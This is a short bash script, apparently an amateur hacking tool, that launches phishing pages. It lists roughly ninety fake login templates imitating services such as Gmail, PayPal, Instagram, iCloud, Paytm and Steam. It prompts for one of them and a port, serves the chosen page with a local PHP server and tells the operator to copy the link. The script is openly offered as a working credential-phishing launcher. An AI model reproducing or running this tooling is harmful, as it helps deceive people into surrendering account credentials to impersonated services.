#! /bin/bash
echo -e "\e[31m"
figlet -f big  KARAN

echo -e "\e[32m"
echo "Welcome to the world of hacking :-)"
figlet -f big phishing
echo " KARAN'S HACKING WORLD:-)"

echo -e "\e[36m"
echo "Available phishing pages"
echo "

   GitHub                     fb_standard           pinterest
   Instagram_VerifiedBadge    flipkart              playstation
   Instagram_advanced_attack  freefire              pornhub
   Instagram_autoliker        gitlab                protonmail
   Instagram_web              gmail                 pubg
   Microsoft                  google_advanced_poll  quora
   Reddit-old                 google_standard       spotify
   Snapchat                   gpay                  stackoverflow
   Snapchat_web               hotstar               steam
   TOOLS                      iCloud                subitoit
   VK                         instafollowers        telegram
   VK_poll_method             jio                   tiktok
   adobe                      jiooffer              tplink
   airtel                     jiorouter             twitch
   airtel-wifi                linkedin              twitter
   apple                      live_web              verizon
   badoo                      messenger             whatsapp
   clash-of-clans             mobikwik              wifi
   cryptocurrency             myspace               wordpress
   devianart                  netflix               xbox
   dropbox                    origin                yahoo_web
   ebay                       paypal                yandex
   fb_advanced_poll           paytm                 ytsubs
   fb_messenger               paytmoffer            google_advanced_web
   shopif                     fb_security_fake      phonepay"





echo -e "\e[33m"
read -p "Phishing site:-~ " page
read -p "Port number:-~ " number

cd /$HOME/Phishing/WebPages/$page
echo -e "\e[96m"
echo "Copy the link"
echo -e "\e[35m"
echo "http://localhost:$number"
php -S localhost:$number  >  /dev/null &


details
